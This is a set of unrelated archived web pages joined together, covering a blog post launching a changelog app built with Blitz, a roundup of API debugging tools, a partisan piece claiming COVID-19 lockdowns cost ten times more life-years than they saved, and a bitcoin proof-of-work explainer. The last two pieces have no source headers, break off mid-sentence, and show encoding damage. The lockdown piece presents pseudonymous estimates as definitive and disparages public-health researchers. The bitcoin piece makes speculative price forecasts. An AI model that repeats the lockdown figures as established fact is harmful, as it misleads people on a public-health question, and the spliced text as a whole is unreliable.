September 3, 2020 | https://kitze.io/posts/launching-fungarzione-with-blitz | <a href="https://web.archive.org/web/*/https://kitze.io/posts/launching-fungarzione-with-blitz">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>You already know that I'm pretty frustrated with the way we do things on the web. In order to fetch a list of things and display them as rectangles on a webpage, we need to jump through 1938137 hoops. What is this, Circus Charlie? Anyone? Remember that game??? I'm old 😭</p>&nbsp;<h2>The problem with our current stack</h2><p>The process of making a web app is so unnecessarily complex and so many people are going for a SPA even when it's not needed. GraphQL makes working with an API easy, but it still involves building that API, and writing a lot of boilerplate. You might not mind all of that until someone removes the layer for you. And that's <a href="https://blitzjs.com/" target="_blank" rel="noopener noreferrer">Blitz</a>.</p>&nbsp;<p>"Damn, I just want to fetch some data directly from the database and display it!" - You, probably</p>&nbsp;<p>"You can do that with PHP and raw SQL..." - Someone on HN, probably</p>&nbsp;<p>"LMAO" - You</p>&nbsp;<p>"Well, why don't you use Rails?" - Someone on Reddit, probably</p>&nbsp;<p>"I only know JavaScript and I want to use React" - You, probably</p>&nbsp;<p>"Welp, too bad there's nothing similar to Rails in the React world..." - Someone on Twitter, probably</p>&nbsp;<p>"Hey, what if there was a Fullstack React framework, similar to Ruby on Rails?" - Blitz, if it could talk, probably</p>&nbsp;<p><em>Meteor crying in the corner, probably</em></p>&nbsp;<h2>What is Blitz?</h2><p>Blitz "removes" the API layer in a very clever way so you can directly call functions from your backend, which completely changes the game. Actually, this is not the best way to describe what it does, so you better <a href="https://blitzjs.com/" target="_blank" rel="noopener noreferrer">read the docs</a>. TL;DR: it's magic.</p>&nbsp;<p>What I like about Blitz is that it builds on top of already solid solutions like <a href="https://nextjs.org/" target="_blank" rel="noopener noreferrer">Next.js</a>, <a href="https://react-query.tanstack.com/" target="_blank" rel="noopener noreferrer">react-query</a>, and <a href="https://prisma.io/" target="_blank" rel="noopener noreferrer">Prisma</a>. I already used them in other projects, but I love the way Blitz glues all of them together and it magically works. </p>&nbsp;<p>The ability to get whatever you want directly from the database, with the nicely typed API from Prisma, and then just display it, is a pretty wonderful experience. It makes me feel that for years we had no frickin' clue why we did things the way we did them, until finally someone realized that we don't have to do them that way.</p>&nbsp;<p>When generating a new Blitz app you get all the authentication boilerplate generated for you and I all I have to say is <em>fucking finally</em>.  It's 2020, I don't want to build the authentication layer again, and again, and again, and again. Hey frameworks, just let me get me the current user with <code>const user = useCurrentUser()</code> and don't bother me with anything else.</p>&nbsp;<p>I can't even describe how fast you can ship a product when there is no API layer and boilerplate involved. </p>&nbsp;<p>There are similar frameworks to Blitz which go in a completely different direction by rebuilding most of the stack. Personally, I'm tired of the React community constantly reinventing things that don't need reinventing. Next.js is already amazing, so just imagine how much code we'd be able to reuse if we all agree on using it by default. More reusing, less reinventing, please.</p>&nbsp;<h2>Launching a production app in a few days</h2><p>I already did <a href="https://www.youtube.com/watch?v=RiLYvLNDeKA" target="_blank" rel="noopener noreferrer">two</a> <a href="https://www.youtube.com/watch?v=Qr-7Z9Grvfw" target="_blank" rel="noopener noreferrer">streams</a> with <a href="https://twitter.com/flybayer" target="_blank" rel="noopener noreferrer">Brandon</a>, the creator of Blitz, and I couldn't wait to actually try Blitz on a real project. The problem is, I needed a real project because I didn't want to waste my time on some demo gibberish which is never going to see the light of day.</p>&nbsp;<p>I got frustrated by the app that I was using for writing changelogs for <a href="https://sizzy.co/" target="_blank" rel="noopener noreferrer">Sizzy</a>, so I decided to sit down and write <a href="https://fungarzione.com/sizzy" target="_blank" rel="noopener noreferrer">my own tool</a> with some more advanced features that will make the process easier. </p>&nbsp;<p>I <a href="https://twitch.tv/thekitze" target="_blank" rel="noopener noreferrer">livestreamed the entire process</a> from "hello world" to deployment and I couldn't believe that it only took me only 5 days. </p>&nbsp;<p>Actually, the majority of the work was done in only 2 days, which is crazy. Someone commented "my boss shouldn't see this" on the stream and the credit for that goes to Blitz. You can definitely ship faster than a team of people who would argue about the modeling of the API, raw SQL queries, and whether to use redux-saga or RxJS for fetching the data.</p>&nbsp;<p>Hey Kitze, if you finished most of the things in 2 days, why did it take you 5 days?</p>&nbsp;<p>Great question, reader.</p>&nbsp;<ul><li><svg viewBox="0 0 14 14" focusable="false" role="presentation"><g fill="currentColor"><polygon points="5.5 11.9993304 14 3.49933039 12.5 2 5.5 8.99933039 1.5 4.9968652 0 6.49933039"></polygon></g></svg>Day 3: Polishing the design and adding extra features</li><li><svg viewBox="0 0 14 14" focusable="false" role="presentation"><g fill="currentColor"><polygon points="5.5 11.9993304 14 3.49933039 12.5 2 5.5 8.99933039 1.5 4.9968652 0 6.49933039"></polygon></g></svg>Day 4: Deployment. I deployed the database to DigitalOcean without a problem, but I had a problem with deploying the Blitz app to Vercel. Turns out, the problem wasn't with Blitz or Vercel and it was ... TypeScript. Yup, I couldn't deploy the app because TS was being a pain in the ass, and the Vercel logs didn't show that. I had to dive deep, find the problematic files, and fix everything, so that took most of the day.</li><li><svg viewBox="0 0 14 14" focusable="false" role="presentation"><g fill="currentColor"><polygon points="5.5 11.9993304 14 3.49933039 12.5 2 5.5 8.99933039 1.5 4.9968652 0 6.49933039"></polygon></g></svg>Day 5: CSS. Of course. You can put as many layers as you want on top of CSS, it's still CSS at the end of the day. I literally lost an entire day on centering things and making sure the fixed header and sticky footer layouts work in Safari on iOS. Oh, by the way, fuck Safari. We finally got rid of the pain that's IE pain, but Safari is here to replace it.</li></ul><h2>Why another changelog app?</h2><p>I would never make an app if there wasn't an actual need for it. There are tons of Saas products for making changelogs, but I had something different in mind.</p>&nbsp;<p>I was using a popular solution for writing the Sizzy changelogs for 1.5 years. However, the changelog was a huge markdown document, so we had to use Notion boards to plan the work as individual cards, and then collaborate on them with the Sizzy team. When we were done, we'd export markdown from all the cards and merge them in a giant markdown document. In the past 3 months, I'm working on the changelog alone, so I decided to directly write the giant markdown document. Aside from being an overwhelming experience, I also lost my 3 hours of progress by accidentally closing the tab.</p>&nbsp;<p>So I said: fuck it, I'd rather build a proper changelog app instead of writing this changelog again.</p>&nbsp;<p>I wanted to improve the process of collaborating and publishing a changelog, and in the process, I came up with a bunch of ideas that will hopefully change the changelog game. Wait... was there ever a <em>changelog game</em>? If not, there is now. Boom 🎤</p>&nbsp;<p>Wait, the mic should actually drop.</p>&nbsp;<p>🎤  </p>&nbsp;<p>There.</p>&nbsp;<h2>Introducing <a href="https://fungarzione.com/" target="_blank" rel="noopener noreferrer">Fungarzione</a> - The Changelog Of The Future</h2><p>Instead of publishing a giant markdown document, a team of collaborators would start working on individual entries. The editor supports Markdown, but also MDX, with a set of custom components that would make the changelogs way better. </p>&nbsp;<p>Creating a changelog entry is super simple, and it's not as overwhelming as starting a giant markdown document.</p>&nbsp;&nbsp;<p>Individual entries can then progress from Draft to Ready For Review, to Published. Team collaboration features like assigning people and commenting on the entries will be available when registration is open to everyone.</p>&nbsp;&nbsp;<p>After creating a bunch of entries, a changelog is created by combininig individual entries, as well as adding a list of small bug fixes and improvements, which will appear grouped at the end of the document.</p>&nbsp;&nbsp;<p>Then, the draft changelog is moved to "Ready for Review" and it cannot be published, unless all of the entries in that changelog area already published.</p>&nbsp;&nbsp;<p>Users can leave feedback individually for each changelog, as well as subscribe to get an email when a new changelog is published.</p>&nbsp;&nbsp;<h2>Fungarzione is live</h2><p>I already ported <a href="http://fungarzione.com/sizzy" target="_blank" rel="noopener noreferrer">the last 10 changelogs for Sizzy</a> to Fungarzione and I'm already in love with the publishing experience. It's not that overwhelming and I can work on the changelog in chunks.</p>&nbsp;<p><em>self high-five</em></p>&nbsp;<p>Also, to be honest, even with my mediocre design skills, it already looks better than some of the popular changelog apps out there 🙈 </p>&nbsp;<p><em>taps myself on the back a bit more</em> </p>&nbsp;<p>If you're interested in signing up you can <a href="https://fungarzione.com/" target="_blank" rel="noopener noreferrer">leave your email here</a> and you'll get a notification when public access is available (hopefully soon).</p>&nbsp;<p>I'm also looking for people who'd like to port their changelog <em>now</em>, so I can get some feedback on the editor experience. You just need to have a production app with an established user base, as well as an existing changelog. Just <a href="mailto:kristijan.mkd@gmail.com" target="_blank" rel="noopener noreferrer">shoot me an email</a> and we can discuss.</p>&nbsp;<h2>Conclusion on Blitz</h2><p>I still have to explore Blitz a bit more to figure out all the downsides, but I think that I'd definitely pick Blitz for most of my future apps, unless I have a really specific reason not to. Brandon said there will be a way to reuse the same Blitz client in React Native apps, so you won't miss the actual API layer.</p>&nbsp;<h2>Fungarzione</h2><p>I know what you're thinking right now.</p>&nbsp;<p>Fungarzione?!</p>&nbsp;<p>FUNGARZIONE?!?! What the hell does the name mean, Kitze?</p>&nbsp;<p>Fungarzione comes from the word Fungangarzione. And the origin of Fungangarzione is really a long story, so I guess you'll have to <a href="https://twitch.tv/thekitze" target="_blank" rel="noopener noreferrer">hang out in my stream</a> to find out 😜 I'm planning to live stream the rest of the work on this app, and trust me, there are too way too many things that I'd like to do. If you have any ideas or suggestions you're more welcome to join my stream! 🙌</p>&nbsp;<p>I want to give another shout-out to all the people on Twitch who helped me while I was building this app (even though they're credited in the footer of the page).</p>&nbsp;<p>There's no way I would've shipped it in such a short time without your help 💜</p>&nbsp;</div></div></div></div>]]>

September 3, 2020 | https://blog.bearer.sh/api-debugging-tools/ | <a href="https://web.archive.org/web/*/https://blog.bearer.sh/api-debugging-tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			<!--kg-card-begin: markdown--><p>Integrating with APIs can be challenging. Each with its own <a href="https://blog.bearer.sh/best-practices-for-navigating-api-documentation/">documentation format</a>, SDK patterns, and authentication quirks. Once you get the integration up and running, the harder step is testing and debugging any problems. This part can be exploratory—before you finish building—or as part of problem resolution.</p>
<p>While you can certainly debug within your codebase, by testing methods and reviewing logs, it can be beneficial to isolate the API calls by using one of the many API testing tools available.</p>
<p>Rather than list the pros and cons of each, let's focus on what makes each tool unique and worth trying.</p>
<h2 id="postman">Postman</h2>
<p>Cost: Free + Paid Plans</p>
<p><img src="https://blog.bearer.sh/content/images/2020/09/postman.png" alt="postman"></p>
<p><a href="https://postman.com/">Postman</a> is an institution in this space. It's been around for years, and went from a small app that made API calls into the full ecosystem that it is today. While Postman's primary use case is building and managing your own APIs, their emphasis on encouraging third-parties to publish collections has made it a great tool for exploring and debugging web services. These collections are what make Postman a fantastic tool for debugging external API calls.</p>
<p>Some providers, like Zendesk, <a href="https://developer.zendesk.com/rest_api/docs/sunshine/custom_objects_api">link directly to their Postman collections</a> in their documentation. Others can be found on Postman's <a href="https://explore.postman.com/">Explore</a> page, and then opened within the Postman app. Once installed, you can explore endpoints and resources with minimal setup.</p>
<p><a href="https://postman.com/">Learn more about Postman</a>.</p>
<h2 id="hoppscotch">Hoppscotch</h2>
<p>Cost: Free</p>
<p><img src="https://blog.bearer.sh/content/images/2020/09/hoppscotch.png" alt="hoppscotch"></p>
<p><a href="https://hoppscotch.io/">Hoppscotch</a> started as a faster, browser-first alternative to Postman, called Postwoman. It has since been rebranded and continues to add features. Its main benefits are speed and availability. It is also <a href="https://github.com/hoppscotch/hoppscotch">open source</a>, and can even run as a browser extension or progressive web app (PWA).</p>
<p><a href="https://hoppscotch.io/">Learn more about Hoppscotch</a>.</p>
<h2 id="paw">Paw</h2>
<p>Cost: Free Trial, then $49.99</p>
<p><img src="https://blog.bearer.sh/content/images/2020/09/paw.png" alt="paw"></p>
<p>Moving on to platform-specific applications, <a href="https://paw.cloud/">Paw</a> is a paid Mac application for interacting with APIs. Like many of the others, it's core focus is on providing a tool to build, test, and document your own APIs. Perhaps Paw's greatest selling point is the UI. Compared to many of the other application's on this list, it really feels like quality Mac-first software. It also offers Team functionality, and an interesting feature called Pawprint that lets you share request/response pairs via a URL, even if the receiver doesn't use Paw.</p>
<p><a href="https://paw.cloud/">Learn more about Paw</a>.</p>
<h2 id="insomnia">Insomnia</h2>
<p>Cost: Free + Paid plans.</p>
<p><img src="https://blog.bearer.sh/content/images/2020/09/insomnia.png" alt="insomnia"></p>
<p><a href="https://insomnia.rest/">Insomnia</a> is another API client that lets you design, debug, and test APIs. Unlike some of the other "all-inclusive" applications, Insomnia splits the API designer functionality into a seperate app. This makes the UI much more approachable, and makes it easier to quickly try out a new request without excess setup and configuration.</p>
<p>One additional tool that you can find in their documentation is a CLI version called Inso. It allows you to use the functionality from both their core Insomnia client as well as the designer app, right from the command line, and even from within CI/CD environments.</p>
<p><a href="https://insomnia.rest/">Learn more about Insomnia</a>.</p>
<h2 id="fiddler">Fiddler</h2>
<p>Cost: Free + Paid plans</p>
<p><img src="https://blog.bearer.sh/content/images/2020/09/fiddler.png" alt="fiddler"></p>
<p>While the rest of the applications in this list are centered around allowing you to directly interface with APIs, <a href="https://www.telerik.com/fiddler">Fiddler</a> takes a different approach. It is more of a general purpose web debugging tool. It acts as a proxy to capture local requests between your device and the internet. This means you can run your application locally, and inspect any outgoing requests and incoming responses from the Fiddler application.</p>
<p>This approach can be useful for live-debugging, but it also allows you to mock requests and responses that match specific rules. Combined with features around creating collections of requests and responses, and the ability to collaborate with a team, this approach could really help debugging more complex API problems.</p>
<p><a href="https://www.telerik.com/fiddler">Learn more about Fiddler</a></p>

<p>Cost: Free + Paid plans</p>
<p><img src="https://blog.bearer.sh/content/images/2020/09/http-toolkit.png" alt="http-toolkit"></p>
<p><a href="https://httptoolkit.tech/">HTTP Toolkit</a> is another proxy-style tool like Fiddler, but it is much easier to use and allows you to target specific apps and devices. Where I had trouble getting Fiddler to recognize calls made from my terminal, HTTP Toolkit just worked immediately. The Pro plans offer some really interesting features, such as modifying calls as they are sent, simulating timeouts, and simulating connection failures. In a lot of ways, it feels like the browser's "Network" panel, but for any application.</p>
<p>There's clearly a goal of developer productivity, shown through small touches like inline documentation for status codes and headers, as well as the ability to export code for the API call itself in a variety of languages. It's also open source, which is always a nice bonus.</p>
<p><a href="https://httptoolkit.tech/">Learn more about HTTP Toolkit</a></p>
<h2 id="bearer">Bearer</h2>
<p>Cost: Free + Paid plans</p>
<p><a href="https://www.bearer.sh/">Bearer</a> takes a different approach, in that it monitors APIs from within your application with minimal code changes. Any common issues are detected and collected in the dashboard, but you can also set up custom rules for edge case problems. This is a great way to actively debug, but also passively keep watch for unexpected problems that may arise with web services.</p>
<p><img src="https://blog.bearer.sh/content/images/2020/09/bearer.png" alt="bearer"></p>
<p><a href="https://www.bearer.sh/">Learn more about Bearer</a></p>

<p>Choosing the right tool, not just for the task, but also for your workflow can be a challenge. Fortunately, all of the options we've looked at here are free or offer free trials to get you started. Whether you're doing some exploratory testing, debugging a rare problem, or looking for a way to make your integrations more reliable, there's an existing API debugging and testing tool that can help.</p>

Revolver Exclusive Study: COVID-19 Lockdowns Over 10 Times More Deadly Than Pandemic Itself </p><div>

<p>A groundbreaking new study commissioned by <em>Revolver News</em> concludes that COVID-19 lockdowns are ten times more deadly than the actual COVID-19 virus in terms of years of life lost by American citizens.</p>
<p>Up until this point there had been no simple, rigorous analysis that accurately and definitively conveys the true costs of the COVID-19 lockdowns. Accordingly, <em>Revolver News</em> set out to commission a study to do precisely that: to finally quantify the net damage of the lockdowns in terms of a metric known as “life-years.” Simply put, we have drawn upon existing economic studies on the health effects of unemployment to calculate an estimate of how many years of life will have been lost due to the lockdowns in the United States, and have weighed this against an estimate of how many years of life will have been saved by the lockdowns. <strong>The results are nothing short of staggering, and suggest that the lockdowns will end up costing Americans over 10 times as many years of life as they will save from the virus itself.</strong></p>
<p>The COVID-19 lockdown measures that Americans have had to endure for the greater part of 2020 represent one of the most dramatic, consequential, and damaging policy measures undertaken in this nation’s history. <strong>For the first time in its history, America has experienced a situation so crippling and perilous that long term financial and social stability have been legitimately threatened.</strong></p>
<p>As with everything in 2020 America, these lockdown measures have become deeply politicized. President Trump opposes further devastating lockdowns. In his recent Republican National Convention speech, President Trump raised the point that lockdowns have had very real and very devastating effects on the lives of many Americans.</p>
<blockquote><p>President Trump: “The cost of the Biden shutdown would be measured in increased drug overdoses, depression, alcohol addiction, suicides, heart attacks, economic devastation, job loss and much more. &nbsp;Joe Biden’s plan is not a solution to the virus, but, rather, it’s a surrender to the virus.” <strong><a href="https://www.politico.com/story/2016/07/full-transcript-donald-trump-nomination-acceptance-speech-at-rnc-225974">[Politico]</a></strong></p></blockquote>
<p>Democrat Presidential candidate Joe Biden, by contrast, has suggested that he is willing to impose further lockdowns if “scientists” tell him to do so. It is unclear which scientists Joe Biden would be listening to, as there is no consensus among scientists and experts as to whether or not lockdowns are worth the staggering costs they impose on the common man.</p>

<p><em>Revolver News </em>is very proud to present a rigorous study on such an important topic and we hope that this will be spread far and wide both within government and without to assist policymakers. This exclusive study is a collaborative guest contribution to <em>Revolver News</em>. Due to the unfortunately politicized nature of the COVID-19 lockdowns, and the associated plausibility of professional repercussions, the authors have chosen for the time being to represent themselves pseudonymously.</p>

<ul>
<li>Standard approaches to evaluating epidemic policy responses, involving the <em>Value of a Statistical Life</em>, have conceptual problems and are biased towards the elderly and rich.</li>
<li>Using a life-years criterion as an alternative shows that the lockdowns cost <strong>an order of magnitude more</strong> life-years than they saved.</li>
<li>Most of the publicized cost-benefit analyses of COVID-19 lockdowns have used coarse measures like lives as units rather than life-years, which misleads politicians and the general public. COVID-19 deaths disproportionately impact the oldest members of the population, whereas the economic impacts of lockdowns disproportionately harm the youngest of the working population, who have far greater life expectancies at the time of impact.</li>
<li>Using prior research on workforce entrants and recent graduates entering into a market marred by an economic recession, empirical estimates of life-years lost can be determined. Extensive research on job displacement can be used to estimate the economic impact in life-years of starkly increased unemployment for mid-to-late career workers.</li>
<li><strong>Combining these analyses, we found that an estimated 18.7 million life-years will be lost in the United States due to the COVID-19 lockdowns. Comparative data analysis between nations shows that the lockdowns in the United States likely had a minimal effect in saving life-years. Using two different comparison groups, we estimate that the COVID-19 lockdowns in the U.S. saved between a quarter to three quarters of a million life-years.</strong></li>
<li>Every broad age category lost life-years from the lockdowns including those 55 and older.</li>
<li>The media and state and local governments contributed to the panic by selectively presenting evidence on COVID-19 and shutdowns of dubious benefit.</li>
<li>Public health researchers and health economists gave poor policy advice and made selective use of the prior research literature. They will likely be rewarded, not punished, by academia for their failure because of academia’s biases.</li>
<li>Public health in general is so biased and vulnerable to motivated cognition that it is not “not yet ready for policy analysis.”</li>

<p><strong>Back-of-the-Envelope Calculations Show COVID-19 “Cure” Is Worse Than Disease</strong></p>
<p>On March 11, 2020, the World Health Organization officially classified COVID-19 as a global pandemic. In the following weeks, the countries of the world began implementing previously unthinkable measures to prevent the spread of the virus. In the United States, some states quickly locked down nearly all physical businesses, venues, and public areas. As a short quarantine rapidly grew into an indefinite lockdown, some lawmakers and economists began asking if the lockdowns would cause more damage than the virus itself. Using empirical research, first-pass estimates can be made about the impact of the unprecedented lockdown in life-years lost. This can then be compared to the number to the estimated life-years lost to COVID-19 in the United States.</p>
<p>Why life-years? It is well-known that socioeconomic status (SES) appears to be linked to life expectancy and some of that association is causal, with higher SESes causing longer life expectancies through a number of channels. Most government policy analysts make decisions using the <em>Value of a Statistical Life (VSLs) —</em> which is about $10 million. If a regulation can save 1 life and costs $9 million, for instance, then it’s worth imposing to save a life. If it costs $11 million, then it’s not worth imposing to save a life. A problem with this approach is how coarse it is. Because SES is linked to life expectancies, actions by the government that do not result in direct loss of life are liable to being simply unaccounted for in this approach. For example, why not set the VSL at $100 million? Or $1? If you set the VSL too low, you will fail to impose many very cheap lifesaving regulations.<strong> Something perhaps more subtle is that if you set the VSL too high, then regulations you impose will reduce income so much by retarding economic activity that you will wind up reducing life expectancies through the SES-life expectancy channel.</strong> There are actually more fundamental issues with the use of a single VSL for all citizens (see Sunstein’s <em>Valuing Life</em> for a good overview), but many find the general equilibrium problems with it very intuitive.</p>
<p><strong>Surprisingly, the COVID-19 conversation among public health analysts, bio-statisticians, economists, and policymakers <em>who are otherwise sensitive to the problems with VSL</em> has been dominated by the standard “coarse” VSL calculation above.</strong> We have seen no full policy analyses utilizing life-year approaches, although various studies have tried to estimate the average life-year losses per COVID-19 death. Controversy over estimating the correct value of a statistical life, problems with actually applying it in analysis as described above, and perhaps a certain odiousness associated with the rendering of human lives in dollar terms have pushed some health economists and public health analysts toward use of a life-years approach. This approach is simple, and in principle, involves no explicit conversion of human lives into money terms — although such a trade-off is implicit in any policy analysis. From the life-years’ perspective, a policymaker can compute the life-years lost and gained if they take a specific action. <strong>For instance, a new airline safety regulation may make users of airlines so safe that they save an average of 0.1 life-years per traveler, but the higher cost of air travel may induce potential passengers to switch to less safe car travel, costing the switchers an average of 0.3 life-years. If enough people switch to car travel, then the airline safety regulation will actually reduce the total life-years lived from the perspective of the transportation system as a whole.</strong></p>
<p>A life-year maximizer would say that the regulation should not be adopted. <strong>An advantage of the life-year approach is that it values all people’s life-years equally in principle. The life-year of an 80 year old is of equal value to that of a 20 year old.</strong> <strong>The …</strong></p></div></div></div>

            <div><div>
  <div><p>OK. What is hashing? Let's just take a look.Â&nbsp;</p></div><div><p>hash("thomas hartman") =&gt; b73d127e8e76ff01b5cb833980b9712cf1dbc92064b1d2fae700105c8227121b</p></div><div><p>This beast is a 64 digit hex number. Instead of the usual 10 digits 0-9, it has the 16 digits 0-9a-f. But, it's just a number. In decimal it would be</p></div><div><p>82881156605080050388863774003735601367246355697689529077366882559854056509979</p></div><div><p>You could also use 1s and 0s, in which case there would be 256 binary 0-1 digits (bits). I'm going to go back to using hex because it will make googling for historically important hashes easier, further on. </p></div><div><p>Hashing takes some some data, my name in this case, and applies some gnarly, but basic -- but tedious -- arithmetic and cut paste type transformations to produce a 256 bit numerical output. The transformation has a lot of steps but is <a href="https://en.bitcoinwiki.org/wiki/SHA-256">completely deterministic</a>. You could do it <a href="https://www.youtube.com/watch?v=y3dqhixzGVo">by hand</a> if you were extremely careful, and extremely patient. It takes 10 hours for a human to compute a hash using pen and graph paper. My MacBook computes a hash in microseconds. </p></div><div><p>There are hundreds of websites where you play around with hashing, and reproduce the hashes we will be discussing. Just google for "sha256 calculator".</p></div><div><p>You could think of a hash as a kind of fingerprint for some arbitrary data. It is theoretically possible, but in practice impossible, for two inputs to hash to the same result. And you can't reverse a hash. If I present you with f04b773b796ddb607c9c0df477b4738a690a626e49f59bc91a37dd0cd05b70eeÂ&nbsp; and ask you to come up with an input that hashes to that, you will never, ever, find one. Unless you have a multi trillion years life span and galactic core black hole level of energy. Then, I suppose, you would get it eventually. Or, I could tell you a secret...</p></div><div><p>hash("joshua summers") =&gt; f04b773b796ddb607c9c0df477b4738a690a626e49f59bc91a37dd0cd05b70eeÂ&nbsp; </p></div><div><p>Moving on, if you tweak the data in a tiny way, say by tacking on the string "123" at the end, you get a completely different result.</p></div><div><p>hash("joshua summers" + "123") =&gt; hash("joshua summers123") =&gt; 304d0d26fd5ebb3bd3f56fcb48f6fdc6c8b0dbf9be088b34835b3ec988be1ab7</p></div><div><p>Completely different looking from the original "joshua summers" hash. We call "123" a nonce. A bit of NONSEnse data that you tack onto some fixed data, that is, data that you care about. The nonce can change and it doesn't matter. The fixed data matters, so it can't change.</p></div><div><p>Hashing always produces a 64 hex digit output. What if we had some fixed data ("joshua summers"), and we wanted a nonce that would make the first digit of the resulting hash 0? "123" didn't work. The first digit of the resulting hash was 3. Let's keep looking... sitting at my macbook, I try nonces manually by incrementing 123 until...</p></div><div><p>hash("joshua summers" + "134") =&gt; hash("joshua summers134") =&gt; </p></div><div><p>0120353865b8576fc09988444bdeed6f44a1d9433a7058064911d66eafda43e3</p></div><div><p>Found one! Took eleven tries. (134-123)</p></div><div><p>And that is hash mining. By producing a nonce and a hash with zero in the first digit, I PROVED I did some WORK connected to the fixed data. The nonce with the hash is like a stamp of authenticity that proves that, for some reason, I care about sacrificing some work attached to the fixed data "joshua summers".</p></div><div><p>Work is another word for energy. Each hash costs my macbook battery a tiny bit of chemical energy. Recall, I could do this by hand instead of using a computer,Â&nbsp; taking 10 hours for each try. I would need feeding, since eleven hashes on graph paper would keep me busy (going slowly insane) for four days. Like my macbook, my body needs energy to hash. </p></div><div><p>On average, I would expect to have to try 16 nonces to get a hit. I got slightly lucky with 11 nonces. If you asked me for a hash that starts with 2 zeros, I would expect to have to try 16 times more nonces, 256 instead of 16. The more zeros, the more energy. </p></div><div><p>For all my hashes, you need to compute just one hash to convince yourself that my work was valid. The proof had better be cheaper than the work (and it is). Just as assaying gold to stop counterfeiters had better be cheaper than digging the gold itself up, or why bother. </p></div><div><p>Now let's talk about bitcoin. With bitcoin mining, instead of your name, the fixed data is an "unconfirmed" (ie unstamped) block. An unconfirmed block is a group of bitcoin ledger transactions, along with a hash of the previous confirmed (stamped) block. The link to the previous block, via that block's hash, is what forges individual blocks into a blockchain. Miners try nonces till they find a stamp (nonce + hash) for that unstamped block that proves they did some work. It is the same as in the example I gave before, just with more zeros. </p></div><div><p>Visually, the difficulty condition is a bunch of zeros at the beginning of the hash. The more zeros required, the more valuable the stamp. Each additional zero makes the search for the stamp 16 times harder. </p></div><div><p>In 2009, the very first bitcoin block, called the genesis block, hashed to </p></div><div><p>000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f (google this) </p></div><div><p>Satoshi mined this block. I picture him with a bunch of scavenged laptops in his mother's basement. He uses multiple laptops to try as many nonces as possible, all hashing at the same time, working in parallel. </p></div><div><p>There are ten zeros of difficulty required for this first block.</p></div><div><p>16*16*16*16*16*16*16*16*16*16 =&gt; 1,099,511,627,776</p></div><div><p>So, satoshi had to try a trillion more nonces than I just did to find a nonce that worked. It took satoshi and his little cluster of computers (his mine) about ten minutes to crack this first block. This is specified in the bitcoin protocol. Blocks should take ten minutes, on average.</p></div><div><p>The energy spent to to find the nonce makes the block precious. Like the diesel spent on earthmoving equipment to find gold makes gold precious. Gold is a precious metal. A bitcoin block hash is a precious number. The more zeros you see at the beginning of a block hash, the more precious the hash. </p></div><div><p>Now let's look at a recent hash, from today (2020)</p></div><div><p>0000000000000000000081f22162e5603c4349b66f12a6b4f4274dff14bdc3bc (you can google this too)</p></div><div><p>It doesn't look that different. It's just 20 zeros instead of 10. But, as we saw before, ten zeros means a trillion times harder. If modern miners were using the same hardware as satoshi, that would be a trillion times as many computers mining, to find the hash in the same ten minutes. A trillion times as much electricity. In fact it's a bit less than that. Modern miners use special single purpose computers, called asics, that are a lot more energy efficient than the general purpose CPUs satoshi started out with. But it's still an enormous amount of hardware and electricity, trying an enormous number of nonces, to solve the next block.</p></div><div><p>All these giant warehouses full of racks and racks of miners are hashing away, because if you solve a block stamp, you receive a block reward of 6.25 bitcoin (currently), plus some transaction fees. Altogether it's about $60k, up for grabs every ten minutes. So, mining is a lottery that pays $60k every ten minutes. If the price of bitcoin goes up, or even if people just expect it to, more miners join. Bitcoin starts to be found too quickly... nine minutes instead of ten minutes... eight minutes... then the protocol adjusts to require enough zerosÂ&nbsp; so he block time goes back to ten minutes. (Slightly hand waving there, but close enough.) This difficulty adjustment happens every two weeks. The increased difficulty (more zeros) means bitcoin got more secure, and this in turn drives price goes up. </p></div><div><p>This is the double ratchet effect that I believe will continue until bitcoin occupies its market niche and replaces money as a global utility in a decade or so. It's worked so far. Three more zeros in the difficulty (around 4000x increase in difficulty) and bitcoin has replaced printed fiat from central banks. ($10 million/bitcoin, as opposed to around $10k today.) It may feel like a lot of ground to cover, but if you just count zeros in the difficulty, bitcoin has practically already won.</p></div><div><p>As mentioned before, each block includes the hash of the previous block. This makes a sequence of blocks, that is, a chain. A blockchain is a chain of blocks. Blocks are expensive.Â&nbsp; So a blockchain is very expensive. </p></div><div><p>The bitcoin protocol says the most expensive blockchain in terms of physical energy, measured in total hashes,Â&nbsp; is the true gold. There can be only one most expensive chain. This is extremely important. <a href="https://www.youtube.com/watch?v=_J3VeogFUOs">There can be only one</a>. </p></div><div><p>An unconfirmed block has no proof of work, so you can't trust the transactions in it if someone just paid you with one of them. The miners haven't approved it. There is no work behind it. So, these expensive stamps of approvals that each block gets (the precious hashes) prevent cheating, that is, double spending the same bitcoin. Mining is a security system. Miners are the bodyguards of bitcoin. </p></div><div><p>You have toÂ&nbsp; pay your bodyguards, or they turn on you. In fact, the largest bitcoin miner, Bitmain, attacked bitcoin in 2017. As the whitepaper foretold, the attack failed. Hundreds of millions of dollars worth of hashes were sacrificed for nothing, and bitmain was nearly driven into bankruptcy. Bodyguards are not hired for their brains. </p></div><div><p>Anyways, miners are paid in block reward, which is newly minted bitcoin, plus transaction fees. The bitcoin supply is finite, with minting scheduled to end in the year 2140. The reward halves every 4 years. For bitcoin to succeed, the transaction fees have to be sufficiently high to motivate miners to keep working hard enough to make bitcoin safe after the block reward eventually goes away. Transaction fees may ultimately stabilize at thousands of dollars per transaction (pennies now). Only power users like banks and pension funds will then be able to afford the blockchain. </p></div><div><p>If this happens, and I think it will, most users will never touch the blockchain directly, but will use second layer systems such as lightning. So far, the gradual replacement of block rewards with transaction fees appears to be working …</p></div></div></div></div></div></div>

    <section>
